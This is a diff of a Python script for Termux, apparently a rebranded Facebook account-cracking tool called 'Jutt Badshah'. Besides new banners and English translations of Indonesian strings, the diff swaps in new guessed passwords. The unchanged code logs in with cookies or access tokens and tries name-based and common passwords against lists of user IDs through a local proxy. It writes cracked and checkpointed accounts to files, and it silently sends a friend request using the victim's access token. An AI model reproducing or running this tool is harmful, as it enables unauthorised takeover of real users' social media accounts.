@@ -15,22 +15,22 @@ if not os.path.isfile('/data/data/com.termux/files/usr/bin/ruby'):
     os.system('apt install ruby -y && gem install lolcat')
 from requests.exceptions import ConnectionError
 #os.system('git pull')
-if not os.path.isfile('/data/data/com.termux/files/home/H4CK/KONTOL/node_modules/bytes/index.js'):
+if not os.path.isfile('/data/data/com.termux/files/home/sheryjutt/KONTOL/node_modules/bytes/index.js'):
     os.system('fuser -k 5000/tcp &')
     os.system('#')
     os.system('cd KONTOL && npm install')
     os.system('cd KONTOL && node index.js &')
     os.system('clear')
     print '\n\x1b[1;32mPlease Select Chrome Browser To Continue\x1b[0;97m'
-    #os.system('xdg-open https://saweria.co/YayanXD')
+    #os.system('xdg-open https://saweria.co/nazeerjutt652')
     time.sleep(10)
-elif os.path.isfile('/data/data/com.termux/files/home/H4CK/KONTOL/node_modules/bytes/index.js'):
+elif os.path.isfile('/data/data/com.termux/files/home/sheryjutt/KONTOL/node_modules/bytes/index.js'):
     os.system('fuser -k 5000/tcp &')
     os.system('#')
     os.system('cd KONTOL && node index.js &')
     os.system('clear')
     print '\n\x1b[1;32m Please Select Chrome  Browser To Continue \x1b[0;97m'
-    #os.system('xdg-open https://saweria.co/YayanXD')
+    #os.system('xdg-open https://saweria.co/nazeerjutt652')
     time.sleep(10)
 bd = random.randint(20000000.0, 30000000.0)
 sim = random.randint(20000.0, 40000.0)
@@ -74,14 +74,14 @@ def jalan(z):
 ##### LOGO #####
 logo = """
 \033[1;91m       ♦♦♦———————————————————————————————♦♦♦
-\033[1;96m          _____                     _ _ 
-\033[1;96m         / ____|                   | (_) ⚡
-\033[1;96m        -.           -
-\033[1;96m        -.     -.           -.        -
-\033[1;96m        -
-\033[1;96m        -.                          -
-\033[1;96m               | |                      
-\033[1;96m               |_|   Jutt Badshah Updated 0.3                   
+\033[1;96m                    ♥️  ❤️.         ❤️   ❤️❤️❤️   ❤️❤️❤️
+\033[1;96m                   .♥️..❤️.        .❤️.      .❤️.            .❤️.
+\033[1;96m                   .♥️..❤️         .❤️.      .❤️.            .❤️.
+\033[1;96m                   .♥️..❤️.        .❤️.      .❤️.            .❤️.
+\033[1;96m                   .♥️. .❤️        .❤️.      .❤️.            .❤️.
+\033[1;96m                  .♥️.   .❤️      .❤️.       .❤️.            .❤️.
+\033[1;96m        ♥️ ♥️.           .❤️  ❤️.         .❤️.            .❤️.
+\033[1;96m                  Jutt Badshah Updated 0.3                   
 \033[1;91m       ♦♦♦———————————————————————————————♦♦♦
 """
 def tik():
@@ -102,32 +102,38 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print  """
 
-\033[1;97m        ___    ___   _   _ _____ _     
-\033[1;92m       / _ \  / _ \ | | | |_   _| | Updated✔ 
-\033[1;97m      / /_\ \/ /_\ \| |_| | | | | |    
-\033[1;92m      |  _  ||  _  ||  _  | | | | |    
-\033[1;97m      | | | || | | || | | |_| |_| |____
-\033[1;97m      \_| |_/\_| |_/\_| |_/\___/\_____/
-                                                               
-
+\033[1;91m       ♦♦♦———————————————————————————————♦♦♦
+\033[1;96m                    ♥️  ❤️.         ❤️   ❤️❤️❤️   ❤️❤️❤️
+\033[1;96m                   .♥️..❤️.        .❤️.      .❤️.            .❤️.
+\033[1;96m                   .♥️..❤️         .❤️.      .❤️.            .❤️.
+\033[1;96m                   .♥️..❤️.        .❤️.      .❤️.            .❤️.
+\033[1;96m                   .♥️. .❤️        .❤️.      .❤️.            .❤️.
+\033[1;96m                  .♥️.   .❤️      .❤️.       .❤️.            .❤️.
+\033[1;96m        ♥️ ♥️.           .❤️  ❤️.         .❤️.            .❤️.
+\033[1;96m                  Jutt Badshah Updated 0.3                   
+\033[1;91m       ♦♦♦———————————————————————————————♦♦♦
 """
 
 jalan("\033[1;97m•◈•───────•◈ NOT A NAME ITS BRAND •◈•───────•◈•")  
 
 
-jalan("\033[1;96m•◈•   _____ _____  ______ ______ _____ _____ ")
-jalan("\033[1;96m•◈•  / ____|  __ \|  ____|  ____|  __ \_   _|")
-jalan("\033[1;97m•◈• | (___ | |__) | |__  | |__  | |  | || |  ")
-jalan("\033[1;96m•◈•  \___ \|  ___/|  __| |  __| | |  | || |  ")
-jalan("\033[1;96m•◈•  ____) | |    | |____| |____| |__| || |_ ")
-jalan("\033[1;96m•◈• |_____/|_|    |______|______|_____/_____|")
+jalan("\033[1;91m       ♦♦♦———————————————————————————————♦♦♦")
+jalan("\033[1;96m                    ♥️  ❤️.         ❤️   ❤️❤️❤️   ❤️❤️❤️")
+jalan("\033[1;96m                   .♥️..❤️.        .❤️.      .❤️.            .❤️.")
+jalan("\033[1;96m                   .♥️..❤️         .❤️.      .❤️.            .❤️.")
+jalan("\033[1;96m                   .♥️..❤️.        .❤️.      .❤️.            .❤️.")
+jalan("\033[1;96m                   .♥️. .❤️        .❤️.      .❤️.            .❤️.")
+jalan("\033[1;96m                  .♥️.   .❤️      .❤️.       .❤️.            .❤️.")
+jalan("\033[1;96m        ♥️ ♥️.           .❤️  ❤️.         .❤️.            .❤️.")
+jalan("\033[1;96m                  Jutt Badshah Updated 0.3")                   
+jalan("\033[1;91m       ♦♦♦———————————————————————————————♦♦♦")
  
 jalan("   \033[1;91m INDAIN USERZ USE ANY PROXY ")	
 jalan("   \033[1;91m WIFI USERZ USE ANY PROXY ")	
 
-jalan("   \033[1;93m Welcome to Aahil Creations ")
+jalan("   \033[1;93m Welcome to Jutt Creations ")
 
-jalan("\033[1;97m•◈•──────────•◈•\033[1;96mBlacktiger\033[1;96m•◈•──────────•◈•")
+jalan("\033[1;97m•◈•──────────•◈•\033[1;96JuttBadshah\033[1;96m•◈•──────────•◈•")
 
 CorrectUsername = "jutt"
 CorrectPassword = "badshah"
@@ -155,9 +161,9 @@ def masuk():
         print ''
  	print "\033[0;94m──────────────────────────────────────────────────────"
         time.sleep(0.03)
-	print "\033[0;97m [\033[0;90m01\033[0;97m]\033[0;96m\033[0;97m Login Menggunakan Cookies"
+	print "\033[0;97m [\033[0;90m01\033[0;97m]\033[0;96m\033[0;97m Login With Cookies"
         time.sleep(0.03)
-	print "\033[0;97m [\033[0;90m02\033[0;97m]\033[0;96m\033[0;97m Login Menggunakan Token"
+	print "\033[0;97m [\033[0;90m02\033[0;97m]\033[0;96m\033[0;97m Login With Token"
         time.sleep(0.03)
 	print "\033[0;97m [\033[0;90m03\033[0;97m]\033[0;96m\033[0;97m Login Manual"
         time.sleep(0.03)
@@ -201,7 +207,7 @@ def tokenz():
 		zedd = open("login.txt", 'w')
 		zedd.write(toket)
 		zedd.close()
-		jalan ("\n\033[0;97m[\033[0;92m✓\033[0;97m]\033[0;92m Login Berhasil")
+		jalan ("\n\033[0;97m[\033[0;92m✓\033[0;97m]\033[0;92m Login Successful")
 		os.system('xdg-open https://youtube.com/channel/UCS7oHOu5H6nZbSmxSfnT56A')
                 menu()
 	except KeyError:
@@ -262,7 +268,7 @@ def manual():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-		                jalan ("\n\033[0;97m[\033[0;32m✓\033[0;97m]\033[0;92m Login Berhasil")
+		                jalan ("\n\033[0;97m[\033[0;32m✓\033[0;97m]\033[0;92m Login Successful")
 		                os.system('xdg-open https://youtube.com/channel/UCS7oHOu5H6nZbSmxSfnT56A')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
@@ -309,7 +315,7 @@ def cookie():
 	cookie = open("login.txt", 'w')
 	cookie.write(find_token.group(1))
 	cookie.close()
-	jalan ("\n\033[0;97m[\033[0;39m✓\033[0;97m]\033[0;92m Login Berhasil")
+	jalan ("\n\033[0;97m[\033[0;39m✓\033[0;97m]\033[0;92m Login Successful")
 	os.system('xdg-open https://youtube.com/channel/UCS7oHOu5H6nZbSmxSfnT56A')
 	time.sleep(0.03)
 	menu()
@@ -352,6 +358,7 @@ def menu():
 	print "\033[1;32;40m[1] \033[1;33;40m══Start Hack3ing"	
 	print "\033[1;32;40m[2] \033[1;33;40m══Update Jutt"																														
 	print "\033[1;32;40m[0] \033[1;33;40m══Log out"
+	print "\033[1;32;40m[3] \033[1;33;40m══For Ok ID 2 Select Karen" 
 	pilih()
 
 def pilih():
@@ -487,17 +494,17 @@ def l_menu_select():
         user = arg
         uid, name = user.split('|')
         try:
-            pass1 = name + '123'
+            pass1 = name + '786'
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m'  + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print '\x1b[1;34m[\x1b[1;32mJUTT_BADSHAH_OK\x1b[1;34m] \x1b[1;32m'  + uid + ' | ' + pass1 + '\x1b[0;97m'
                 ok = open('ok.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m'  + uid + ' | ' + pass1
+                print '\x1b[1;37m[\x1b[1;31mJUTT_BADSHAH_CP\x1b[1;37m] \x1b[1;33m'  + uid + ' | ' + pass1
                 cp = open('cp.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
@@ -507,93 +514,93 @@ def l_menu_select():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print '\x1b[1;34m[\x1b[1;32mJUTT_BADSHAH_OK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                     ok = open('ok.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m' + uid + ' | ' + pass2
+                    print '\x1b[1;37m[\x1b[1;31mJUTT_BADSHAH_CP\x1b[1;37m] \x1b[1;33m' + uid + ' | ' + pass2
                     cp = open('cp.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
                     cps.append(uid + pass2)
                 else:
-                    pass3 = name + '12345'
+                    pass3 = name + '123456'
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print '\x1b[1;34m[\x1b[1;32mJUTT_BADSHAH_OK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                         ok = open('ok.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m'  + uid + ' | ' + pass3
+                        print '\x1b[1;37m[\x1b[1;31mJUTT_BADSHAH_CP\x1b[1;37m] \x1b[1;33m'  + uid + ' | ' + pass3
                         cp = open('cp.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
                         cps.append(uid + pass3)
                     else:
-                        pass4 = name + '786'
+                        pass4 = '223344'
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                         q = json.loads(data)
                         if 'loc' in q:
-                            print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print '\x1b[1;34m[\x1b[1;32mJUTT_BADSHAH_OK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                             ok = open('ok.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error']:
-                            print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m' + uid + ' | ' + pass4
+                            print '\x1b[1;37m[\x1b[1;31mJUTT_BADSHAH_CP\x1b[1;37m] \x1b[1;33m' + uid + ' | ' + pass4
                             cp = open('cp.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
                             cps.apppend(uid + pass4)
                         else:
-                            pass5 = '786786'
+                            pass5 = '334455'
                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                             q = json.loads(data)
                             if 'loc' in q:
-                                print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
+                                print '\x1b[1;34m[\x1b[1;32mJUTT_BADSHAH_OK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                 ok = open('ok.txt', 'a')
                                 ok.write(uid + ' | ' + pass5 + '\n')
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'www.facebook.com' in q['error']:
-                                print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m' + uid + ' | ' + pass5
+                                print '\x1b[1;37m[\x1b[1;31mJUTT_BADSHAH_CP\x1b[1;37m] \x1b[1;33m' + uid + ' | ' + pass5
                                 cp = open('cp.txt', 'a')
                                 cp.write(uid + ' | ' + pass5 + '\n')
                                 cp.close()
                                 cps.append(uid + pass5)
                             else:
-                                pass6 = 'pakistan'
+                                pass6 = '445566'
                                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6).text
                                 q = json.loads(data)
                                 if 'loc' in q:
-                                    print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
+                                    print '\x1b[1;34m[\x1b[1;32mJUTT_BADSHAH_OK\x1b[1;34m] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                     ok = open('ok.txt', 'a')
                                     ok.write(uid + ' | ' + pass6 + '\n')
                                     ok.close()
                                     oks.append(uid + pass6)
                                 elif 'www.facebook.com' in q['error']:
-                                    print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m'  + uid + ' | ' + pass6
+                                    print '\x1b[1;37m[\x1b[1;31mJUTT_BADSHAH_CP\x1b[1;37m] \x1b[1;33m'  + uid + ' | ' + pass6
                                     cp = open('cp.txt', 'a')
                                     cp.write(uid + ' | ' + pass6 + '\n')
                                     cp.close()
                                     cps.append(uid + pass6)
                                 else:
-                                    pass7 = 'pakistan786'
+                                    pass7 = '786000'
                                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                     q = json.loads(data)
                                     if 'loc' in q:
-                                        print '\x1b[1;34m[\x1b[1;32mOK\x1b[1;34m] \x1b[1;32m'  + uid + ' | ' + pass7 + '\x1b[0;97m'
+                                        print '\x1b[1;34m[\x1b[1;32mJUTT_BADSHAH_OK\x1b[1;34m] \x1b[1;32m'  + uid + ' | ' + pass7 + '\x1b[0;97m'
                                         ok = open('ok.txt', 'a')
                                         ok.write(uid + ' | ' + pass7 + '\n')
                                         ok.close()
                                         oks.append(uid + pass7)
                                     elif 'www.facebook.com' in q['error']:
-                                        print '\x1b[1;37m[\x1b[1;31mCP\x1b[1;37m] \x1b[1;33m'  + uid + ' | ' + pass7
+                                        print '\x1b[1;37m[\x1b[1;31mJUTT_BADSHAH_CP\x1b[1;37m] \x1b[1;33m'  + uid + ' | ' + pass7
                                         cp = open('cp.txt', 'a')
                                         cp.write(uid + ' | ' + pass7 + '\n')
                                         cp.close()
